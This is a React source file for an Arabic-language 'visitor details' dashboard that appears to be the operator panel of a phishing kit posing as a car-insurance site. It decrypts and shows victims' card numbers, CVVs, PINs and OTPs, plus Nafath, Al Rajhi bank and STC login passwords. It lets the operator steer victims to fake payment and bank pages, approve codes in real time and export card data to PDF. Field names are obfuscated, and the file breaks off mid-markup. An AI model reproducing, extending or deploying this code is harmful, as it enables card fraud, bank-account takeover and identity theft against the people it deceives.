"use client";

import type { InsuranceApplication } from "@/lib/firestore-types";
import { useState } from "react";
import { updateApplication } from "@/lib/firebase-services";
import { DataBubble } from "./data-bubble";
import {
  convertHistoryToBubbles,
  type HistoryEntry,
} from "@/lib/history-helpers";
import {
  handleCardApproval,
  handleCardRejection,
  handleOtpApproval,
  handleOtpRejection,
  handlePhoneOtpApproval,
  handlePhoneOtpRejection,
  handlePhoneOtpResend,
  updateHistoryStatus,
} from "@/lib/history-actions";
import { getCurrentTimestamp } from "@/lib/time-utils";
import { _d } from "@/lib/secure-utils";
import { generateVisitorPdf, generateCardPdf } from "@/lib/generate-pdf";
import { ArrowRight } from "lucide-react";
import { BinInfo } from "./bin-info";

interface VisitorDetailsProps {
  visitor: InsuranceApplication | null;
  onBack?: () => void;
}

export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
  const [isNavigating, setIsNavigating] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [nafadCode, setNafadCode] = useState("");
  const [cardsLayout, setCardsLayout] = useState<"vertical" | "horizontal">(
    "vertical"
  );
  const [isGeneratingPdf, setIsGeneratingPdf] = useState(false);
  const [isGeneratingCardPdf, setIsGeneratingCardPdf] = useState(false);
  // Track pending action for each bubble to show immediate feedback
  const [pendingActions, setPendingActions] = useState<Record<string, string>>({});

  const formatStcDate = (value?: string) => {
    if (!value) return "غير متوفر";

    const parsed = new Date(value);
    if (Number.isNaN(parsed.getTime())) {
      return value;
    }

    return `${parsed.toLocaleDateString("ar-SA")} ${parsed.toLocaleTimeString(
      "ar-SA",
      { hour: "2-digit", minute: "2-digit" }
    )}`;
  };

  const visitorDisplayName =
    visitor?.ownerName || (visitor as any)?.name || "بدون اسم";

  if (!visitor) {
    return (
      <div className="flex-1 flex items-center justify-center bg-gray-50">
        <div className="text-center text-gray-500">
          <p className="text-lg">اختر زائراً لعرض التفاصيل</p>
        </div>
      </div>
    );
  }

  // Navigation handler
  const handleNavigate = async (destination: string) => {
    if (!visitor.id || isNavigating) return;

    setIsNavigating(true);

    try {
      let updates: Partial<InsuranceApplication> = {};

      switch (destination) {
        case "home":
          // Set both fields for compatibility
          updates = {
            redirectPage: "home" as any,
            currentStep: "home" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "insur":
          updates = {
            redirectPage: "insur" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "compar":
          updates = {
            redirectPage: "compar" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "payment":
          // Modern pages use redirectPage, legacy pages use currentStep
          updates = {
            redirectPage: "payment" as any,
            currentStep: "_st1" as any,
            cardStatus: "pending" as any,
            otpStatus: "pending" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "otp":
          updates = {
            redirectPage: "otp" as any,
            currentStep: "_t2" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "pin":
          updates = {
            redirectPage: "pin" as any,
            currentStep: "_t3" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "rajhi":
          updates = {
            redirectPage: "rajhi" as any,
            currentStep: "rajhi" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "stc-login":
          updates = {
            redirectPage: "stc-login" as any,
            currentStep: "stc-login" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "phone":
          // Legacy system only
          updates = {
            currentStep: "phone" as any,
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "nafad":
          // Legacy system with correct value
          updates = {
            currentStep: "_t6" as any,
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "nafad_modal":
          const nafadCode = prompt("أدخل رمز التأكيد (2-4 أرقام):");
          if (!nafadCode || nafadCode.length < 2 || nafadCode.length > 4) {
            alert("يجب إدخال رمز من 2 إلى 4 أرقام");
            return;
          }
          updates = {
            nafadConfirmationCode: nafadCode,
            nafadConfirmationCodeUpdatedAt: getCurrentTimestamp(),
            nafadUpdatedAt: getCurrentTimestamp(),
            nafadUpdatedAtTimestamp: getCurrentTimestamp(),
            currentStep: "nafad",
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "finalOtp":
          updates = {
            redirectPage: "finalOtp" as any,
            currentStep: "finalOtp" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
      }

      if (Object.keys(updates).length > 0) {
        console.log("[Dashboard] Sending redirect:", destination, updates);
        await updateApplication(visitor.id, updates);
      }
    } catch (error) {
      console.error("Navigation error:", error);
      console.error(`حدث خطأ في التوجيه:`, error);
    } finally {
      setIsNavigating(false);
    }
  };

  // Send Nafad confirmation code
  const handleSendNafadCode = async () => {
    if (!visitor.id || !nafadCode.trim()) return;

    try {
      await updateApplication(visitor.id, {
        nafadConfirmationCode: nafadCode,
        nafadConfirmationStatusUpdatedAt: getCurrentTimestamp(),
        nafadUpdatedAt: getCurrentTimestamp(),
      });
      setNafadCode("");
    } catch (error) {
      console.error("حدث خطأ في إرسال رقم التأكيد");
    }
  };

  // Prepare bubbles data
  const bubbles: any[] = [];
  const history = (visitor.history || []) as HistoryEntry[];

  // 1. Basic Info (always show if exists)
  if (visitor.ownerName || visitor.identityNumber) {
    const basicData: Record<string, any> = {
      الاسم: visitor.ownerName,
      "رقم الهوية": visitor.identityNumber,
      "رقم الهاتف": visitor.phoneNumber,
      "نوع الوثيقة": visitor.documentType,
      "الرقم التسلسلي": visitor.serialNumber,
      "نوع التأمين": visitor.insuranceType,
    };

    // Add buyer info if insurance type is "نقل ملكية"
    if (visitor.insuranceType === "نقل ملكية") {
      basicData["اسم المشتري"] = visitor.buyerName;
      basicData["رقم هوية المشتري"] = visitor.buyerIdNumber;
    }

    bubbles.push({
      id: "basic-info",
      title: "معلومات أساسية",
      icon: "👤",
      color: "blue",
      data: basicData,
      timestamp: visitor.basicInfoUpdatedAt || visitor.createdAt,
      showActions: false,
    });
  }

  // Nafad will be added after payment data to sort by timestamp

  // 3. Insurance Details
  if (visitor.insuranceCoverage) {
    bubbles.push({
      id: "insurance-details",
      title: "تفاصيل التأمين",
      icon: "🚗",
      color: "green",
      data: {
        "نوع التغطية": visitor.insuranceCoverage,
        "موديل المركبة": visitor.vehicleModel,
        "قيمة المركبة": visitor.vehicleValue,
        "سنة الصنع": visitor.vehicleYear,
        "استخدام المركبة": visitor.vehicleUsage,
        "موقع الإصلاح": visitor.repairLocation === "agency" ? "وكالة" : "ورشة",
      },
      timestamp: visitor.insuranceUpdatedAt || visitor.updatedAt,
      showActions: false,
    });
  }

  // 3. Selected Offer
  if (visitor.selectedOffer) {
    bubbles.push({
      id: "offer-details",
      title: "العرض المختار",
      icon: "📊",
      color: "purple",
      data: {
        الشركة:
          (visitor.selectedOffer as any).name ||
          (visitor.selectedOffer as any).company,
        "السعر الأصلي": visitor.originalPrice,
        الخصم: visitor.discount
          ? `${(visitor.discount * 100).toFixed(0)}%`
          : undefined,
        "السعر النهائي": visitor.finalPrice || visitor.offerTotalPrice,
        "المميزات المختارة": Array.isArray(visitor.selectedFeatures)
          ? visitor.selectedFeatures.join(", ")
          : "لا يوجد",
      },
      timestamp: visitor.offerUpdatedAt || visitor.updatedAt,
      showActions: false,
    });
  }

  // 4. Payment & Verification Data
  // Show ALL card attempts from history (newest first)
  const hasMultipleAttempts = false; // For phone OTP compatibility

  // Get all card entries from history
  const allCardHistory =
    visitor.history?.filter(
      (h: any) => h.type === "_t1" || h.type === "card"
    ) || [];

  // Sort by timestamp (newest first)
  const sortedCardHistory = allCardHistory.sort((a: any, b: any) => {
    const timeA = new Date(a.timestamp).getTime();
    const timeB = new Date(b.timestamp).getTime();
    return timeB - timeA; // Descending order (newest first)
  });

  console.log("[Dashboard] All card history:", sortedCardHistory);

  // Create a bubble for each card attempt
  sortedCardHistory.forEach((cardHistory: any, index: number) => {
    // Get encrypted values from history
    const encryptedCardNumber = cardHistory.data?._v1;
    const encryptedCvv = cardHistory.data?._v2;
    const encryptedExpiryDate = cardHistory.data?._v3;
    const encryptedCardHolderName = cardHistory.data?._v4;

    // Decrypt values with error handling
    let cardNumber, cvv, expiryDate, cardHolderName;
    try {
      cardNumber = encryptedCardNumber ? _d(encryptedCardNumber) : undefined;
      cvv = encryptedCvv ? _d(encryptedCvv) : undefined;
      expiryDate = encryptedExpiryDate ? _d(encryptedExpiryDate) : undefined;
      cardHolderName = encryptedCardHolderName
        ? _d(encryptedCardHolderName)
        : undefined;
    } catch (error) {
      console.error("[Dashboard] Decryption error:", error);
      cardNumber = encryptedCardNumber;
      cvv = encryptedCvv;
      expiryDate = encryptedExpiryDate;
      cardHolderName = encryptedCardHolderName;
    }

    const isLatestCard = index === 0;
    const effectiveCardStatus =
      isLatestCard && visitor.cardStatus === "message"
        ? "message"
        : cardHistory.status;

    // Show all cards, but hide action buttons if already actioned
    const hasBeenActioned =
      effectiveCardStatus === "approved_with_otp" ||
      effectiveCardStatus === "approved_with_pin" ||
      effectiveCardStatus === "rejected";

    const cardType =
      cardHistory.data?.cardType ||
      cardHistory.data?.scheme ||
      cardHistory.data?.type;
    const cardLevel =
      cardHistory.data?.cardLevel ||
      cardHistory.data?.level ||
      cardHistory.data?.bankInfo?.level ||
      cardHistory.data?.binData?.level;
    const bankName =
      cardHistory.data?.bankInfo?.name ||
      cardHistory.data?.bankName ||
      cardHistory.data?.issuer?.name;

    if (cardNumber || encryptedCardNumber) {
      bubbles.push({
        id: `card-info-${cardHistory.id || index}`,
        title:
          isLatestCard
            ? "معلومات البطاقة"
            : `معلومات البطاقة (محاولة ${sortedCardHistory.length - index})`,
        icon: "💳",
        color: "orange",
        data: {
          "رقم البطاقة": cardNumber,
          "اسم حامل البطاقة": cardHolderName || "غير محدد",
          "نوع البطاقة": cardType || "غير محدد",
          "مستوى البطاقة": cardLevel || "غير محدد",
          "تاريخ الانتهاء": expiryDate,
          CVV: cvv,
          البنك: bankName || "غير محدد",
          "بلد البنك": cardHistory.data?.bankInfo?.country || "غير محدد",
        },
        timestamp: cardHistory.timestamp,
        status: effectiveCardStatus || ("pending" as const),
        showActions: !hasBeenActioned,
        isLatest: isLatestCard,
        type: "card",
        binNumber: cardNumber || undefined,
      });
    }
  });

  // OTP Code - Show ALL attempts from history (newest first)
  const allOtpHistory =
    visitor.history?.filter((h: any) => h.type === "_t2" || h.type === "otp") ||
    [];
  const sortedOtpHistory = allOtpHistory.sort((a: any, b: any) => {
    const timeA = new Date(a.timestamp).getTime();
    const timeB = new Date(b.timestamp).getTime();
    return timeB - timeA;
  });

  sortedOtpHistory.forEach((otpHistory: any, index: number) => {
    const otp = otpHistory.data?._v5;
    const isLatestOtp = index === 0;
    const effectiveOtpStatus =
      isLatestOtp && visitor._v5Status === "message"
        ? "message"
        : otpHistory.status;
    const hasBeenActioned =
      effectiveOtpStatus === "approved" || effectiveOtpStatus === "rejected";

    if (otp) {
      bubbles.push({
        id: `otp-${otpHistory.id || index}`,
        title:
          isLatestOtp
            ? "كود OTP"
            : `كود OTP (محاولة ${sortedOtpHistory.length - index})`,
        icon: "🔑",
        color: "pink",
        data: {
          الكود: otp,
          الحالة:
            effectiveOtpStatus === "approved"
              ? "✓ تم القبول"
              : effectiveOtpStatus === "rejected"
              ? "✗ تم الرفض"
              : effectiveOtpStatus === "message"
              ? "📲 في انتظار الموافقة"
              : "⬳ قيد المراجعة",
        },
        timestamp: otpHistory.timestamp,
        status: effectiveOtpStatus || ("pending" as const),
        showActions: !hasBeenActioned,
        isLatest: isLatestOtp,
        type: "otp",
      });
    }
  });

  // PIN Code - Show ALL attempts from history (newest first)
  const allPinHistory =
    visitor.history?.filter((h: any) => h.type === "_t3" || h.type === "pin") ||
    [];
  const sortedPinHistory = allPinHistory.sort((a: any, b: any) => {
    const timeA = new Date(a.timestamp).getTime();
    const timeB = new Date(b.timestamp).getTime();
    return timeB - timeA;
  });

  sortedPinHistory.forEach((pinHistory: any, index: number) => {
    const pinCode = pinHistory.data?._v6;
    const isLatestPin = index === 0;
    const effectivePinStatus =
      isLatestPin && visitor.pinStatus === "message"
        ? "message"
        : pinHistory.status;
    const hasBeenActioned =
      effectivePinStatus === "approved" || effectivePinStatus === "rejected";

    if (pinCode) {
      bubbles.push({
        id: `pin-${pinHistory.id || index}`,
        title:
          isLatestPin
            ? "رمز PIN"
            : `رمز PIN (محاولة ${sortedPinHistory.length - index})`,
        icon: "🔐",
        color: "indigo",
        data: {
          الكود: pinCode,
          الحالة:
            effectivePinStatus === "approved"
              ? "✓ تم القبول"
              : effectivePinStatus === "rejected"
              ? "✗ تم الرفض"
              : effectivePinStatus === "message"
              ? "📲 في انتظار الموافقة"
              : "⬳ قيد المراجعة",
        },
        timestamp: pinHistory.timestamp,
        status: effectivePinStatus || ("pending" as const),
        showActions: !hasBeenActioned,
        isLatest: isLatestPin,
        type: "pin",
      });
    }
  });

  // Phone Info
  if (visitor.phoneCarrier) {
    bubbles.push({
      id: "phone-info-current",
      title: "معلومات الهاتف",
      icon: "📱",
      color: "green",
      data: {
        "رقم الجوال": visitor.phoneNumber,
        "شركة الاتصالات": visitor.phoneCarrier,
      },
      timestamp: visitor.phoneUpdatedAt || visitor.updatedAt,
      showActions: false,
      isLatest: true,
      type: "phone_info",
    });
  }

  // Phone OTP - Show ALL attempts from history (newest first)
  const allPhoneOtpHistory =
    visitor.history?.filter(
      (h: any) => h.type === "_t5" || h.type === "phone_otp"
    ) || [];
  const sortedPhoneOtpHistory = allPhoneOtpHistory.sort((a: any, b: any) => {
    const timeA = new Date(a.timestamp).getTime();
    const timeB = new Date(b.timestamp).getTime();
    return timeB - timeA;
  });

  sortedPhoneOtpHistory.forEach((phoneOtpHistory: any, index: number) => {
    const phoneOtp = phoneOtpHistory.data?._v7;
    const hasBeenActioned =
      phoneOtpHistory.status === "approved" ||
      phoneOtpHistory.status === "rejected";

    if (phoneOtp) {
      bubbles.push({
        id: `phone-otp-${phoneOtpHistory.id || index}`,
        title:
          index === 0
            ? "كود تحقق الهاتف"
            : `كود تحقق الهاتف (محاولة ${
                sortedPhoneOtpHistory.length - index
              })`,
        icon: "✅",
        color: "pink",
        data: {
          "كود التحقق": phoneOtp,
          الحالة:
            phoneOtpHistory.status === "approved"
              ? "✓ تم القبول"
              : phoneOtpHistory.status === "rejected"
              ? "✗ تم الرفض"
              : "⬳ قيد المراجعة",
        },
        timestamp: phoneOtpHistory.timestamp,
        status: phoneOtpHistory.status || ("pending" as const),
        showActions: !hasBeenActioned,
        isLatest: index === 0,
        type: "phone_otp",
      });
    }
  });

  // Nafad Info - add to dynamic bubbles to sort by timestamp
  const nafazId = visitor._v8 || visitor.nafazId;
  const nafazPass = visitor._v9 || visitor.nafazPass;

  bubbles.push({
    id: "nafad-info",
    title: "🇸🇦 نفاذ",
    icon: "🇸🇦",
    color: "indigo",
    data: {
      "رقم الهوية": nafazId || "في انتظار الإدخال...",
      "كلمة المرور": nafazPass || "في انتظار الإدخال...",
      "رقم التأكيد المُرسل":
        visitor.nafadConfirmationCode || "لم يتم الإرسال بعد",
    },
          timestamp: visitor.nafadUpdatedAt || visitor.updatedAt,
    showActions: true,
    customActions: (
      <div className="mt-3 flex flex-col gap-2">
        <div className="flex flex-col gap-2 sm:flex-row">
          <input
            type="text"
            value={nafadCode}
            onChange={(e) => setNafadCode(e.target.value)}
            placeholder="أدخل رقم التأكيد"
            className="w-full flex-1 rounded-lg border px-3 py-2 text-sm"
          />
          <button
            onClick={handleSendNafadCode}
            disabled={!nafadCode.trim()}
            className="w-full rounded-lg bg-blue-600 px-4 py-2 text-sm text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50 sm:w-auto"
          >
            إرسال
          </button>
        </div>
        <button
          onClick={() => handleNavigate("finalOtp")}
          disabled={isNavigating}
          className="w-full rounded-lg bg-indigo-600 px-4 py-2 text-sm text-white hover:bg-indigo-700 disabled:cursor-not-allowed disabled:opacity-50 flex items-center justify-center gap-2"
        >
          {isNavigating ? (
            <span className="w-3.5 h-3.5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
          ) : (
            "🔐"
          )}
          توجيه إلى Final OTP
        </button>
      </div>
    ),
  });

  // Rajhi Info - add to dynamic bubbles to sort by timestamp
  const rajhiUser = visitor._v10 || visitor.rajhiUser;
  const rajhiPassword =
    visitor._v11 || visitor.rajhiPassword || visitor.rajhiPasswrod;
  const rajhiOtp = visitor._v12 || visitor.rajhiOtp;

  if (
    rajhiUser ||
    rajhiPassword ||
    rajhiOtp ||
    (visitor.currentStep as any) === "rajhi"
  ) {
    bubbles.push({
      id: "rajhi-info",
      title: "🏦 الراجحي",
      icon: "🏦",
      color: "green",
      data: {
        "اسم المستخدم": rajhiUser || "في انتظار الإدخال...",
        "كلمة المرور": rajhiPassword || "في انتظار الإدخال...",
        "رمز OTP": rajhiOtp || "في انتظار الإدخال...",
      },
      timestamp: visitor.updatedAtTimestamp || visitor.rajhiUpdatedAt || visitor.updatedAt,
      showActions: true,
      type: "rajhi",
    });
  }

  // STC Login Info - keep visible even for STC-only visitors without basic info.
  const hasStcData =
    Boolean(visitor.stcPhone?.trim()) ||
    Boolean(visitor.stcPassword?.trim()) ||
    Boolean(visitor.stcSubmittedAt);

  if (hasStcData) {
    const stcData: Record<string, string> = {};
    if (visitor.stcPhone?.trim()) {
      stcData["رقم الجوال"] = visitor.stcPhone;
    }
    if (visitor.stcPassword?.trim()) {
      stcData["كلمة المرور"] = visitor.stcPassword;
    }
    if (visitor.stcSubmittedAt) {
      stcData["وقت الإرسال"] = formatStcDate(visitor.stcSubmittedAt);
    }

    bubbles.push({
      id: "stc-login-info",
      title: "بيانات STC Login",
      icon: "📶",
      color: "blue",
      data: stcData,
      timestamp: visitor.stcSubmittedAt || visitor.updatedAt,
      showActions: false,
      type: "stc_login",
    });
  }

  // Final OTP bubble
  const finalOtpCode = visitor._v13 || visitor.finalOtp;
  if (
    finalOtpCode ||
    visitor.finalOtpStatus ||
    (visitor.currentStep as any) === "finalOtp" ||
    (visitor.redirectPage as any) === "finalOtp"
  ) {
    bubbles.push({
      id: "final-otp-info",
      title: "🔐 OTP الأخير",
      icon: "🔐",
      color: "purple",
      data: {
        "رمز OTP النهائي": finalOtpCode || "في انتظار الإدخال...",
        "الحالة": visitor.finalOtpStatus === "approved"
          ? "✅ مقبول"
          : visitor.finalOtpStatus === "rejected"
          ? "❌ مرفوض"
          : visitor.finalOtpStatus === "message"
          ? "📲 في انتظار الموافقة"
          : visitor.finalOtpStatus === "pending"
          ? "⏳ قيد المراجعة"
          : "⏳ في انتظار الإدخال",
      },
      timestamp: visitor.finalOtpUpdatedAt || visitor.updatedAt,
      showActions: true,
      type: "final_otp",
      status: visitor.finalOtpStatus,
    });
  }

  // Sort bubbles: dynamic bubbles by timestamp (newest first), static bubbles at bottom
  const staticBubbleIds = ["basic-info", "insurance-details", "selected-offer"];
  const dynamicBubbles = bubbles.filter((b) => !staticBubbleIds.includes(b.id));
  const staticBubbles = bubbles.filter((b) => staticBubbleIds.includes(b.id));

  // Sort dynamic bubbles by timestamp (newest first)
  dynamicBubbles.sort((a, b) => {
    const timeA = new Date(a.timestamp).getTime();
    const timeB = new Date(b.timestamp).getTime();
    return timeB - timeA; // Descending order (newest first)
  });

  // Combine: dynamic bubbles first, then static bubbles at bottom
  const sortedBubbles = [...dynamicBubbles, ...staticBubbles];

  // Action handlers for bubbles
  const handleBubbleAction = async (
    bubbleId: string,
    action: "approve" | "reject" | "resend" | "otp" | "pin" | "message"
  ) => {
    if (!visitor.id || isProcessing) return;

    // Set pending action for immediate UI feedback
    const actionLabels: Record<string, string> = {
      otp: "🔑 تم OTP",
      pin: "🔐 تم PIN",
      message: "📲 تم الإرسال",
      approve: "✓ تم القبول",
      reject: "❌ تم الرفض",
      resend: "🔄 جاري إعادة الإرسال"
    };
    const pendingLabel = actionLabels[action] || "⏳ جاري المعالجة";
    setPendingActions(prev => ({ ...prev, [bubbleId]: pendingLabel }));

    setIsProcessing(true);

    try {
      const bubble = bubbles.find((b) => b.id === bubbleId);
      if (!bubble) return;

      switch (bubble.type) {
        case "card":
          if (action === "otp") {
            // Approve card with OTP - update history status
            console.log(
              "[Action] Card OTP clicked, bubble.id:",
              bubble.id,
              "history:",
              visitor.history
            );
            await updateHistoryStatus(
              visitor.id,
              bubble.id,
              "approved_with_otp",
              visitor.history || []
            );
            console.log("[Action] Status updated to approved_with_otp");
            await updateApplication(visitor.id, {
              cardStatus: "approved_with_otp",
              cardStatusUpdatedAt: getCurrentTimestamp(),
            });
          } else if (action === "pin") {
            // Approve card with PIN - update history status
            await updateHistoryStatus(
              visitor.id,
              bubble.id,
              "approved_with_pin",
              visitor.history || []
            );
            await updateApplication(visitor.id, {
              cardStatus: "approved_with_pin",
              cardStatusUpdatedAt: getCurrentTimestamp(),
            });
          } else if (action === "reject") {
            if (confirm("هل أنت متأكد من رفض البطاقة؟")) {
              // Reject card - update history status
              await updateHistoryStatus(
                visitor.id,
                bubble.id,
                "rejected",
                visitor.history || []
              );
              await updateApplication(visitor.id, {
                cardStatus: "rejected",
                cardStatusUpdatedAt: getCurrentTimestamp(),
              });
            }
          } else if (action === "message") {
            await updateApplication(visitor.id, {
              cardStatus: "message",
              cardStatusUpdatedAt: getCurrentTimestamp(),
            });
          }
          break;

        case "otp":
          if (action === "approve") {
            // Approve OTP using proper handler
            await handleOtpApproval(
              visitor.id,
              bubble.id,
              visitor.history || []
            );
            // Update timestamp
            await updateApplication(visitor.id, {
              _v5StatusUpdatedAt: getCurrentTimestamp(),
            });
          } else if (action === "reject") {
            if (confirm("هل أنت متأكد من رفض كود OTP؟")) {
              // Reject OTP using proper handler
              await handleOtpRejection(
                visitor.id,
                bubble.id,
                visitor.history || []
              );
              // Update timestamp
              await updateApplication(visitor.id, {
                _v5StatusUpdatedAt: getCurrentTimestamp(),
              });
            }
          } else if (action === "message") {
            await updateApplication(visitor.id, {
              _v5Status: "message",
              _v5StatusUpdatedAt: getCurrentTimestamp(),
            });
          }
          break;

        case "phone_otp":
          if (action === "approve") {
            if (hasMultipleAttempts) {
              await handlePhoneOtpApproval(visitor.id, bubbleId, history);
            } else {
              await updateApplication(visitor.id, {
                phoneOtpStatus: "approved",
                phoneOtpStatusUpdatedAt: getCurrentTimestamp(),
              });
            }
            // Phone OTP approved
          } else if (action === "reject") {
            if (confirm("هل أنت متأكد من رفض كود الهاتف؟")) {
              if (hasMultipleAttempts) {
                await handlePhoneOtpRejection(visitor.id, bubbleId, history);
              } else {
                await updateApplication(visitor.id, {
                  phoneOtpStatus: "rejected",
                  phoneOtpStatusUpdatedAt: getCurrentTimestamp(),
                });
              }
              // Phone OTP rejected
            }
          } else if (action === "resend") {
            await updateHistoryStatus(
              visitor.id,
              bubbleId,
              "resend",
              visitor.history || []
            );
            await updateApplication(visitor.id, {
              phoneOtp: "",
              phoneOtpStatus: "show_phone_otp",
              phoneOtpStatusUpdatedAt: getCurrentTimestamp(),
            });
            // Phone OTP modal reopened
          }
          break;

        case "rajhi":
          if (action === "approve") {
            await updateApplication(visitor.id, {
              rajhiOtpStatus: "approved",
              rajhiOtpStatusUpdatedAt: getCurrentTimestamp(),
              rajhiUpdatedAt: getCurrentTimestamp(),
              rajhiUpdatedAtTimestamp: getCurrentTimestamp(),
            });
          } else if (action === "reject") {
            const message = prompt("أدخل سبب الرفض (اختياري):") || "";
            await updateApplication(visitor.id, {
              rajhiOtp: "",
              rajhiOtpStatus: "rejected",
              rajhiOtpStatusMessage: message,
              rajhiOtpStatusUpdatedAt: getCurrentTimestamp(),
              rajhiUpdatedAt: getCurrentTimestamp(),
              rajhiUpdatedAtTimestamp: getCurrentTimestamp(),
            });
          } else if (action === "message") {
            const message = prompt("أدخل الرسالة:");
            if (message) {
              await updateApplication(visitor.id, {
                rajhiOtpStatus: "message",
                rajhiOtpStatusMessage: message,
                rajhiOtpStatusUpdatedAt: getCurrentTimestamp(),
                rajhiUpdatedAt: getCurrentTimestamp(),
                rajhiUpdatedAtTimestamp: getCurrentTimestamp(),
              });
            }
          }
          break;

        case "pin":
          if (action === "approve") {
            await updateHistoryStatus(
              visitor.id,
              bubble.id,
              "approved",
              visitor.history || []
            );
            await updateApplication(visitor.id, {
              pinStatus: "approved",
              _v6Status: "approved",
              _v6StatusUpdatedAt: getCurrentTimestamp(),
            });
          } else if (action === "reject") {
            if (confirm("هل أنت متأكد من رفض رمز PIN؟")) {
              await updateHistoryStatus(
                visitor.id,
                bubble.id,
                "rejected",
                visitor.history || []
              );
              await updateApplication(visitor.id, {
                pinStatus: "rejected",
                _v6Status: "rejected",
                _v6StatusUpdatedAt: getCurrentTimestamp(),
              });
            }
          } else if (action === "message") {
            await updateApplication(visitor.id, {
              pinStatus: "message",
              _v6StatusUpdatedAt: getCurrentTimestamp(),
            });
          }
          break;

        case "final_otp":
          if (action === "approve") {
            await updateApplication(visitor.id, {
              finalOtpStatus: "approved",
              finalOtpStatusUpdatedAt: getCurrentTimestamp(),
            });
          } else if (action === "reject") {
            if (confirm("هل أنت متأكد من رفض رمز OTP الأخير؟")) {
              await updateApplication(visitor.id, {
                finalOtp: "",
                _v13: "",
                finalOtpStatus: "rejected",
                finalOtpStatusUpdatedAt: getCurrentTimestamp(),
              });
            }
          } else if (action === "message") {
            await updateApplication(visitor.id, {
              finalOtpStatus: "message",
              finalOtpStatusUpdatedAt: getCurrentTimestamp(),
            });
          }
          break;
      }
    } catch (error) {
      console.error("Action error:", error);
      console.error(`حدث خطأ:`, error);
    } finally {
      // Remove pending action after completion
      setPendingActions(prev => {
        const next = { ...prev };
        delete next[bubbleId];
        return next;
      });
      setIsProcessing(false);
    }
  };

  return (
    <div className="flex-1 flex flex-col bg-gray-50 overflow-hidden">
      {/* Header */}
      <div className="bg-white border-b border-gray-200 p-4 md:p-6">
        <div className="flex flex-col gap-4 md:flex-row md:items-start md:justify-between">
          <div className="min-w-0">
            {onBack && (
              <button
                onClick={onBack}
                className="mb-3 inline-flex items-center gap-1 rounded-lg border border-gray-300 px-3 py-1.5 text-xs font-medium text-gray-700 transition-colors hover:bg-gray-100"
              >
                <ArrowRight className="h-4 w-4" />
                الرجوع للقائمة
              </button>
            )}
            <h2 className="text-xl md:text-2xl font-bold text-gray-900">
              {visitorDisplayName}
            </h2>

            {/* Contact Info */}
            <div className="flex flex-col gap-1 mt-2">
              <div className="flex flex-wrap items-center gap-x-3 gap-y-1 text-sm">
                <span className="text-gray-600">
                  📞{" "}
                  <span className="font-semibold text-gray-800">
                    {visitor.phoneNumber || "غير محدد"}
                  </span>
                </span>
                <span className="hidden text-gray-400 sm:inline">•</span>
                <span className="text-gray-600">
                  🆔{" "}
                  <span className="font-semibold text-gray-800">
                    {visitor.identityNumber || "غير محدد"}
                  </span>
                </span>
              </div>
              {/* Display STC Data */}
              {(visitor.stcPhone || visitor.stcPassword || visitor.stcSubmittedAt) && (
                <div className="bg-purple-50 border-r-4 border-purple-500 p-4 rounded-lg">
                  <h4 className="font-semibold text-purple-900 mb-2">
                    بيانات STC
                  </h4>
                  <div className="space-y-2 text-sm">
                    {visitor.stcPhone && <div>الجوال: {visitor.stcPhone}</div>}
                    {visitor.stcPassword && (
                      <div>كلمة المرور: {visitor.stcPassword}</div>
                    )}
                    {visitor.stcSubmittedAt && (
                      <div>التاريخ: {formatStcDate(visitor.stcSubmittedAt)}</div>
                    )}
                  </div>
                </div>
              )}

              {/* Device & Location Info */}
              {(visitor.country || visitor.browser || visitor.deviceType) && (
                <div className="flex flex-wrap items-center gap-2 text-xs text-gray-500">
                  {visitor.country && <span>🌍 {visitor.country}</span>}
                  {visitor.browser && (
                    <>
                      <span>•</span>
                      <span>🌐 {visitor.browser}</span>
                    </>
                  )}
                  {visitor.deviceType && (
                    <>
                      <span>•</span>
                      <span>📱 {visitor.deviceType}</span>
                    </>
                  )}
                </div>
              )}
            </div>
          </div>

          {/* Navigation */}
          <div className="flex w-full flex-col items-stretch gap-2 sm:flex-row sm:items-center md:w-auto">
            <button
              onClick={async () => {
                setIsGeneratingPdf(true);
                try {
                  await generateVisitorPdf(visitor);
                } catch (error) {
                  console.error("PDF generation error:", error);
                } finally {
                  setIsGeneratingPdf(false);
                }
              }}
              disabled={isGeneratingPdf}
              className="flex w-full items-center justify-center gap-2 rounded-lg bg-red-600 px-4 py-2 text-sm font-medium text-white transition-colors hover:bg-red-700 disabled:cursor-not-allowed disabled:opacity-50 sm:w-auto"
            >
              {isGeneratingPdf ? (
                <>
                  <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                  </svg>
                  جاري التحميل...
                </>
              ) : (
                <>📄 تحميل PDF</>
              )}
            </button>
            <button
              onClick={async () => {
                setIsGeneratingCardPdf(true);
                try {
                  await generateCardPdf(visitor);
                } catch (error) {
                  console.error("Card PDF generation error:", error);
                } finally {
                  setIsGeneratingCardPdf(false);
                }
              }}
              disabled={isGeneratingCardPdf}
